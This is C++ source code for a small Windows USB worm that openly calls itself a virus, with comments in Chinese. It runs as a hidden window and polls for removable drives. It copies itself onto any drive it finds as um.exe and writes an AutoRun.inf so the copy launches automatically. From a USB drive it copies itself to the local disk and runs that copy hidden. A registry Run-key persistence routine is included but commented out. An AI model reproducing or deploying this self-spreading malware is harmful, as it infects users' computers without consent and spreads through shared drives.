#include <windows.h>
#include <Shlwapi.h>
#include <fstream>
#include <TlHelp32.h>
using namespace std;
#define TIMER 1//计时器
#define WM_FROMC WM_USER+0//自定义消息　从C盘中启动
#define WM_FROMU WM_USER+1//自定义消息　从U盘中启动

//function 
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//窗口过程


//病毒从U盘启动时用到的函数
BOOL FileExist(TCHAR *path);//测试一个文件是否存在
BOOL GetSelfPath(TCHAR *path);//Get the virus"s path
BOOL FindU(TCHAR *u);//check whether u exist, u[2]
BOOL GetSysPath(TCHAR *path);//得到系统路径
BOOL CopyToSysAndSet(HWND hwnd);//复制自身到系统目录和设置
BOOL SetFileAttrib(TCHAR *path);//设置path所指文件的属性
//BOOL RegAutoRun(TCHAR *path);//修改注册表，实现自启动

//从C盘启动时用到函数
BOOL CopyToUAndSet();//复制自己到U盘
BOOL CreateAutoRunFile(TCHAR *path);//在U盘下生成autorun.inf文件
BOOL FindSelf();//测试自己是否在已经执行了

//global variable
TCHAR szExePath[MAX_PATH];//the virus"s path
TCHAR U[2];//保存U盘的盘符
TCHAR szSysPath[MAX_PATH];//system path

//constant 
const TCHAR *szExeName="um.exe";
const TCHAR *szAutoRunFile="AutoRun.inf";

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR  szCmdLine, int iCmdShow)
{
	static TCHAR szAppName[]=TEXT ("virus");
	HWND hwnd;
	MSG msg;
	WNDCLASS wndclass;

	wndclass.style=0;
	wndclass.lpfnWndProc=WndProc;
	wndclass.cbClsExtra=0;
	wndclass.cbWndExtra=0;
	wndclass.hInstance=hInstance;
	wndclass.hIcon=0;
	wndclass.hCursor=0;
	wndclass.hbrBackground=0;
	wndclass.lpszMenuName=NULL;
	wndclass.lpszClassName=szAppName;
	if (!RegisterClass (&wndclass))
	{
		MessageBox (NULL,TEXT("Program requires Windows NT!"),szAppName,MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow (szAppName, NULL,WS_DISABLED,0,0,0,0,NULL, NULL,hInstance, NULL);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,LPARAM  lParam)
{
	switch(message)
	{
		// 处理一些要下面要用到的全局变量
		case WM_CREATE:
			GetSysPath(szSysPath);//得到系统路径
			SetTimer(hwnd,TIMER,5000,NULL);//启动计时器
			GetSelfPath(szExePath);//得到自身的路径
			return 0;
		//timer message 
		case WM_TIMER:
			if(szExePath[0]=='D')
			{
				if(FindU(U))
				{
					SendMessage(hwnd,WM_FROMC,0,0);
				}

			}
			else
				SendMessage(hwnd,WM_FROMU,0,0);
			return 0;

		case WM_FROMC:
			CopyToUAndSet();
			return 0;

		case WM_FROMU:
			CopyToSysAndSet(hwnd);
			return 0;

		case WM_DESTROY:
			KillTimer(hwnd,TIMER);
			PostQuitMessage(0);
			return 0;
	}
	return ::DefWindowProc(hwnd, message, wParam, lParam);
}

BOOL GetSelfPath(TCHAR *path)
{
	if(GetModuleFileName(NULL,path,MAX_PATH))//得到程序自身的目录
	{
		return TRUE;
	}
	else 
	{
		return FALSE;
	}
}

BOOL FindU(TCHAR *u)
{
	u[1]=':';
	for(char d='C';d<='Z';d++)//遍历C到Z
	{
		u[0]=d;
		if(GetDriveType(u)==DRIVE_REMOVABLE)//判断是不是可移动的盘
				return TRUE;
	}
	return FALSE;
} 

BOOL GetSysPath(TCHAR *path)
{
	return GetSystemDirectory(path,MAX_PATH);//得到系统路径
}

BOOL CopyToSysAndSet(HWND hwnd)
	{ 
	TCHAR szPath[MAX_PATH];
	lstrcpy(szPath,"d:");
	lstrcat(szPath,"\\");
	lstrcat(szPath,szExeName);//得到复制到系统目录的完整目录
	if(!FileExist(szPath))//检测是否已经存在复制的文件
	{
		CopyFile(szExePath,szPath,FALSE);
		//RegAutoRun(szPath);
		return SetFileAttrib(szPath);
	}
	else
	{
		if(!FindSelf())//检测自己有没有运行
		WinExec(szPath,SW_HIDE);//没有就执行
		//WinExec(szPath,SW_HIDE);
		//SendMessage(hwnd,WM_CLOSE,0,0);//结束自己
	}
	return FALSE;
}

BOOL FileExist(TCHAR *path)//检测PATH所指的路径的文件是否存在
{
	int result;
	result=PathFileExists(path);
	return (BOOL)(result);
}

BOOL SetFileAttrib(TCHAR *path)
{
	return SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
}

BOOL RegAutoRun(TCHAR *path)//修改注册表
{
	/*
	HKEY hkey;
	if(RegOpenKey (HKEY_LOCAL_MACHINE,"SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run", &hkey)==ERROR_SUCCESS)
	{
		RegSetvalueEx(hkey,szExeName,0,REG_SZ,(BYTE*)path,lstrlen(path));
		RegCloseKey(hkey);
		return TRUE;
	}
	else 
	{
		return FALSE;
	}
	*/
	return TRUE;
}

BOOL CopyToUAndSet()
{
	TCHAR szPath[MAX_PATH];
	lstrcpy(szPath,U);
	lstrcat(szPath,"\\");
	lstrcat(szPath,szExeName);//得到指向U盘的完整目录

	TCHAR szAutoFile[MAX_PATH];
	lstrcpy(szAutoFile,U);
	lstrcat(szAutoFile,"\\");
	lstrcat(szAutoFile,szAutoRunFile);

	//if(!FileExist(szAutoFile))
	//{
	CreateAutoRunFile(szAutoFile);
	SetFileAttrib(szAutoFile);
	//}
	if(!FileExist(szPath))
	{
		CopyFile(szExePath,szPath,FALSE);
		return SetFileAttrib(szPath);
	}
	MessageBox (NULL, "人员", "标题", MB_OK); 
	return FALSE;
}

BOOL CreateAutoRunFile(TCHAR *path) //在U盘下创建一个autorun.inf文件
{
	ofstream fout;
	fout.open(path);
	if(fout)
	{
		fout<<"[AutoRun]"<<endl;
		fout<<"open=um.exe e"<<endl;
		fout<<"shellexecute=um.exe e"<<endl;
		fout<<"shell\\Auto\\command=um.exe e"<<endl;
		//fout<<"shell=Auto"<<endl;
		fout.close();
		return TRUE;
	}
	return FALSE;
}

BOOL FindSelf()
{
	PROCESSENTRY32 pe;
	HANDLE hShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe.dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(hShot,&pe))
	{
		do
		{
			if(lstrcmp(pe.szExeFile,szExeName)==0)
			{
				CloseHandle(hShot);
				return TRUE;
			}
		}
		while(Process32Next(hShot,&pe));
	}
	CloseHandle(hShot);
	return FALSE;
}
